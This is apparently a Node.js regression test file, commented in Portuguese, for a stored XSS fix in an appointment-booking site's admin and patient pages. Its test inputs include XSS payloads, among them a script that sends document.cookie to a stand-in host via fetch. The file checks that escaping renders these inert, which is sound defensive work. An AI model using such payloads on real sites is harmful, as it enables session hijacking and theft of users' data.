// Testes de regressão para o XSS armazenado do painel e da página do paciente.
//
// Contexto: o formulário de agendamento é público. Nome, telefone, e-mail e
// observação são digitados por qualquer visitante e ficam guardados. O painel
// administrativo e a página "meus agendamentos" montavam esses valores dentro de
// `innerHTML`, então um payload como `<img src=x onerror=alert(1)>` no campo
// "nome" executava script no navegador autenticado da psicóloga.
//
// A correção escapa na saída (funções `escapeHtml` / `escapeJsAttr` em
// `public/api.js`). Estes testes cobrem a função de escape e garantem que as
// páginas não voltem a interpolar dados não confiáveis sem escape.

const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');

const { escapeHtml, escapeJsAttr } = require('../public/api.js');

const PAGINAS = {
  admin: fs.readFileSync(path.join(__dirname, '..', 'public', 'admin.html'), 'utf8'),
  meusAgendamentos: fs.readFileSync(
    path.join(__dirname, '..', 'public', 'meus-agendamentos.html'),
    'utf8'
  ),
};

describe('escapeHtml neutraliza HTML vindo do paciente', () => {
  test('escapa a tag de script', () => {
    assert.equal(escapeHtml('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  test('escapa vetor via atributo de evento (img onerror)', () => {
    const payload = '<img src=x onerror=alert(1)>';
    const saida = escapeHtml(payload);
    assert.equal(saida.includes('<'), false, 'não pode sobrar "<"');
    assert.equal(saida.includes('>'), false, 'não pode sobrar ">"');
    assert.equal(saida, '&lt;img src=x onerror=alert(1)&gt;');
  });

  test('escapa as duas formas de aspas (contexto de atributo)', () => {
    assert.equal(escapeHtml(`" onmouseover="alert(1)`), '&quot; onmouseover=&quot;alert(1)');
    assert.equal(escapeHtml(`' onmouseover='alert(1)`), '&#39; onmouseover=&#39;alert(1)');
  });

  test('escapa o & antes de gerar entidades (não duplica escape)', () => {
    assert.equal(escapeHtml('&lt;'), '&amp;lt;');
    assert.equal(escapeHtml('Tom & Jerry'), 'Tom &amp; Jerry');
  });

  test('o payload clássico vira texto inerte', () => {
    const payload = '"><script>fetch("https://exemplo.invalid/?c="+document.cookie)</script>';
    const saida = escapeHtml(payload);
    assert.equal(saida.includes('<script'), false);
    assert.equal(saida.includes('"'), false);
    assert.ok(saida.includes('&lt;script&gt;'));
  });

  test('preserva acentos, emoji e caracteres legítimos', () => {
    assert.equal(escapeHtml('Verônica Paz 🧠 José'), 'Verônica Paz 🧠 José');
    assert.equal(escapeHtml('João & Maria'), 'João &amp; Maria');
  });

  test('trata nulo, indefinido e números sem quebrar', () => {
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
    assert.equal(escapeHtml(0), '0');
    assert.equal(escapeHtml(42), '42');
  });

  test('não é vulnerável ao payload de entidade HTML dupla', () => {
    // Se o escape fosse aplicado duas vezes, `&amp;lt;` apareceria; aqui o
    // objetivo é só confirmar que uma passada neutraliza a tag.
    const saida = escapeHtml('&amp;lt;script&amp;gt;');
    assert.equal(saida.includes('<script'), false);
  });
});

describe('escapeJsAttr protege argumento dentro de atributo de evento', () => {
  test('escapa aspas simples que fechariam a string do handler', () => {
    const payload = "');alert(1);//";
    const saida = escapeJsAttr(payload);
    assert.equal(saida.includes("'"), false, 'não pode sobrar aspa simples');
    assert.ok(saida.includes('&#39;'));
  });

  test('neutraliza quebra de linha usada para montar segunda instrução', () => {
    const saida = escapeJsAttr('linha1\nlinha2\rlinha3');
    assert.equal(saida.includes('\n'), false);
    assert.equal(saida.includes('\r'), false);
    assert.equal(saida, 'linha1&#10;linha2&#13;linha3');
  });

  test('escapa barra invertida que escaparia o delimitador', () => {
    assert.equal(escapeJsAttr('a\\'), 'a&#92;');
  });
});

describe('páginas não voltam a interpolar dados não confiáveis sem escape', () => {
  // Campos que vêm do formulário público e portanto nunca podem entrar crus.
  const CAMPOS = ['nome', 'telefone', 'email', 'mensagem'];

  /**
   * Devolve só os trechos que são de fato atribuídos a `innerHTML`, que é o
   * sink real. Interpolar um campo fora daqui (ex.: numa mensagem de WhatsApp
   * que passa por `encodeURIComponent`) não é XSS.
   */
  function trechosHtml(html) {
    const trechos = [];
    const marcador = /\.innerHTML\s*=\s*`/g;
    let m;
    while ((m = marcador.exec(html)) !== null) {
      const fim = html.indexOf('`;', m.index + m[0].length);
      if (fim !== -1) {
        trechos.push(html.slice(m.index, fim));
      }
    }
    return trechos;
  }

  for (const [rotulo, html] of Object.entries(PAGINAS)) {
    test(`${rotulo}: nenhuma interpolação crua de campo do paciente em innerHTML`, () => {
      const trechos = trechosHtml(html);
      assert.ok(trechos.length > 0, `nenhum innerHTML encontrado em ${rotulo}`);
      for (const trecho of trechos) {
        for (const campo of CAMPOS) {
          const cru = new RegExp(`\\$\\{(?:ag|agendamento)\\.${campo}\\}`, 'g');
          assert.equal(
            (trecho.match(cru) || []).length,
            0,
            `\${...${campo}} sem escapeHtml dentro de innerHTML em ${rotulo}`
          );
        }
      }
    });

    test(`${rotulo}: nenhum onclick inline com dado do paciente`, () => {
      // onclick="foo('${...}')" foi a segunda via de injeção (dentro do JS).
      const inlinePerigoso = /onclick="[^"]*\$\{/g;
      assert.equal(
        (html.match(inlinePerigoso) || []).length,
        0,
        `onclick inline com interpolação em ${rotulo}`
      );
    });

    test(`${rotulo}: usa o helper de escape importado de api.js`, () => {
      assert.ok(html.includes('escapeHtml('), `${rotulo} não chama escapeHtml`);
    });
  }

  test('api.js expõe os helpers para o navegador e para os testes', () => {
    const api = require('../public/api.js');
    assert.equal(typeof api.escapeHtml, 'function');
    assert.equal(typeof api.escapeJsAttr, 'function');
  });
});
